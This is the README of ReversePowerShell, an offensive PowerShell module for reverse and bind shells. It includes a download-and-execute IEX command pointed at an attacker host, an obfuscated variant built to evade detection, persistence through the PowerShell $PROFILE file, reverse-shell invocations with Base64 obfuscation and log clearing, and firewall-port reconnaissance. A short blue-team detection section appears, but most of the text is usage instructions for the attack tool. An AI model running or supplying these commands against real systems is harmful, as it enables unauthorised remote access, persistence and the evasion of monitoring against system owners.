# ReversePowerShell
__See "Command Usage:" section below for command usage details__
### NOW IN POWERSHELL GALLERY!!!
```powershell
# Install Module
Install-Module ReversePowerShell

# Update Module
Update-Module -Name ReversePowerShell
# OR
Install-Module ReversePowerShell -Force
```
---

Functions that can be used to gain Reverse Shells with PowerShell. Invoke-ReversePowerShell function can be used
to connect to Start-Listener as well as netcat and Metasploit modules or whatever other listeners you use.
This is a PowerShell module meaning it only contains functions/cmdlets to be imported into a PowerShell session.
If you wish to execute one of the commands whenever the file is run just add the command you wish to execute to the bottom of the file.

#### BLUE TEAM DISCOVERY
Find-ReverseShell.ps1 can be used to search the Windows Event Log for when a Reverse Shell is created that uses a System.Net.Sockets.TcpListener object. This will discover any reverse shell that creates a TcpListener object and not just the below module. This method does not catch PowerCat.ps1 which I am still looking for a good way to discover. This part is still a work in progress.

#### WAYS TO INSTALL OR IMPORT THE MODULE
This is not a requirement. It just a way of saving the module to your device if you wish to keep it around for use at later times.<br>
Install this module by placing the cloned folder "__ReversePowerShell__" inside the following directory location. You can view all available Module install directories by issung the command ```$env:PSModulePath```<br>
 __"$env:USERPROFILE\\WindowsPowerShell\\Modules\\ReversePowerShell"__ <br>
 For PowerShell Core v6 the location of this module will need to be<br>
 __"$env:USERPROFILE\\WindowsPowerShell\\ReversePowerShell"__<br>

Once there it can be imported into a PowerShell session using the following command.
```powershell
Import-Module ReversePowerShell
```
Or in cases where you want to import the module from whatever file you are in...
```powershell
Import-Module .\ReversePowerShell.psm1
```

If your are able to use Invoke-Expresion (IEX), this module (ReversePowerShell) can be imported using the following command.
You can also copy and paste the functions into your PowerShell session so the cmdlets become available to run.
Notice the .ps1 extension. When using downloadString this will need to be a ps1 file to inject the module into
memory in order to run the cmdlets.
```powershell
IEX (New-Object -TypeName Net.WebClient).downloadString("http://<attacker ipv4>/ReversePowerShell.ps1")

# To obfuscate the above command you can do something like the below command
& (`G`C`M *ke-E*) '(& (`G`C`M *ew-O*) `N`E`T`.`W`E`B`C`L`I`E`N`T)."`D`O`W`N`L`O`A`D`S`T`R`I`N`G"('htt'+'p://'+'127.0.0.1/ReversePowerShell.ps1')
```

IEX is blocked from users in most cases and Import-Module is monitored by things such as ATP. Downloading files to a target machine is not always allowed in a penetration test. Another method to use is Invoke-Command. This can be done using the following format.
```powershell
Invoke-Command -ComputerName <target device> -FilePath .'\ReversePowerShell.ps1m' -Credential (Get-Credential)
```
This will execute the file and it's contents on the remote computer.

Another sneaky method would be to have the function load at the start of a new PowerShell window. This can be done by editing the $PROFILE file.
```powershell
Write-Verbose "Creates powershell profile for user"
If (!(Test-Path -Path $PROFILE)) { New-Item -Path $PROFILE -ItemType File -Force }
#
# The $PROFILE VARIABLE IS EITHER GOING TO BE
#    - C:\Users\<username>\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
# OR
#    - C:\Users\<username>\OneDrive\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
#
> Adding this module into the PowerShell $PROFILE will import all of the commands every time the executing user opens a PowerShell session. This means you will need to open a new PowerShell session after doing this in order to access the commands. Just like using ```source .bashrc``` to apply changes to the ~/.bashrc file in a linux terminal you can reload the profile by doing the following.
```powershell
cmd /c 'copy \\<attacker ip>\MyShare\ReversePowerShell.ps1 $env:USERPROFILE\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.psm1
powershell.exe # Maybe but not sure on this one
& $PROFILE
```

# Command Usage:

#### START BIND SHELL
The below command can be executed to start a bind shell that connects the defined port to PowerShell.
This command binds PowerShell to port 8088. I do not have a function that can connect to this. Netcat,
ncat, metasploit, and other tools can be used to connect to this bind shell. I will add a tool in the
future. You are able to use Ctrl + C to cancel the bind listener.
```powershell
Start-Bind -Port 8088
```

#### START LISTENER
The below command was executed to start a listener on the Attack machine on port 8089. This can be
connected too using Invoke-ReversePowerShell as well as ncat, netcat, metasploit, and other tools.
The listener can be stopped or canceld by doing Ctrl + C.
```powershell
Start-Listener -Port 8089
```

### INVOKE-REVERSEPOWERSHELL USAGE INFORMATION
__SPECIAL FEATURES OF INVOKE-REVERSEPOWERSHELL__
- __Re-Connect Loop__ This cmdlet automatically attempts to reconnect to a listener if a session get disconnected. As long as the powershell process is running it will attempt to connect back to a listener every 30 seconds. In available situations a 30 second timer is displayed. The countdown timer can be viewed in the image below.
![Reconnection Timer Loop](https://raw.githubusercontent.com/tobor88/ReversePowerShell/master/images/ReconnectTimer.png)
- __Obfuscation__ parameter can be used to obfuscate executed commands using Base64. The Event Viewer will show logs such as the ones in the below image when this parameter is defined.
![Obfuscation in Event Viewer](https://raw.githubusercontent.com/tobor88/ReversePowerShell/master/images/PSObfuscatedEventLog.png)
- __Clear History__ parameter can be used to clear the current sessions command history and log file. The purpose of this is to help keep clear text passwords from appearing in log files.

#### ISSUE REVERSE SHELL CONNECTION
The below command is to be issued on the Target Machine. The below command connected to the listener over port 8089.
```powershell
Invoke-ReversePowerShell -IpAddress 192.168.0.10 -Port 8089
# OR
# Including the default parameter set name issue the below command
Invoke-ReversePowerShell -Reverse -IpAddress 192.168.0.10 -Port 8089
```

In the below command the listening port 8089 on 192.168.0.10 is connected too. When the session is exited the -ClearHistory parameter specified attempts to clear your sessions command history as well as clear the powershell log file.
```powershell
Invoke-ReversePowerShell -IpAddress 192.168.0.10 -Port 8089 -ClearHistory
# OR
# Including the default parameter set name issue the below command
Invoke-ReversePowerShell -Reverse -IpAddress 192.168.0.10 -Port 8089 -ClearHistory
```

The below command is to be issued on the Target Machine. The below command connected to the listener over port 8089. The -Obfuscate parameter obfuscates the commands executed using Base64 so they do not appear in clear text in the Event Log.
```powershell
Invoke-ReversePowerShell -IpAddress 192.168.0.10 -Port 8089 -Obfuscate
# OR
# Including the default parameter set name issue the below command
Invoke-ReversePowerShell -Reverse -IpAddress 192.168.0.10 -Port 8089 -Obfuscate
```

#### ISSUE BIND SHELL CONNECTION
The below command is used to connect to a listening Bind Shell port. Any of the special parameters can be used to with the Bind parameter set name as well.
```powershell
Invoke-ReversePowerShell -Bind -IpAddress 192.168.0.10 -Port 8089
```

#### FIND EVIDENCE OF REVERSE SHELL CONNECTION
```powershell
# Check the localhost for evidence of reverse shell in the event logs
Find-ReversePowerShell

# Checks remote computer DC01 for evidence of a shell connection and saves the event results to C:\Temp\results.xml
Find-ReverseShell -ComputerName DC01.domain.com -FilePath C:\Temp\Results.xml
```

---
# MISC INFO
#### FIREWALL AND BLOCKED PORTS
If you are not able to gain a connection it is most likely due to the Windows Firewall. If you have access on a machine as a user you will not be able to make firewall changes. You need admin priviledges for that. Use the high range ports RPC would connect to or other common port. If a range has been defined you can find the allowed ports at "HKLM:\Software\Microsoft\Rpc\Internet\ with Entry name Data Type". Otherwise when not defined any ports between 49152-65535 might work.
This command may also display the port allowed RPC port range
```cmd
netsh int ipv4 show dynamicport tcp
```

The following commands can be used to view firewall rules. If one of these does not work.
the other might.
```powershell
# This way should work to display the firewall even if you are a user
$FirewallRule = New-Object -ComObject HNetCfg.FwPolicy2
$FirewallRule.Rules | Select-Object -Property *

# OR
Get-NetFirewallRule | Where-Object { $_.Enabled –eq ‘True’ –and $_.Direction –eq ‘Inbound’ }
Show-NetFirewallRule

# OR
cmd /c netsh advfirewall firewall show rule name=all
```

#### VERIFY LISTENING PORTS
You can verify/view actively listening ports on the target computer by issuing the following command.
```powershell
Get-NetTcpConnection -State Listen
```
or if you are a command prompt kind of person;
```powershell
netstat -q
```
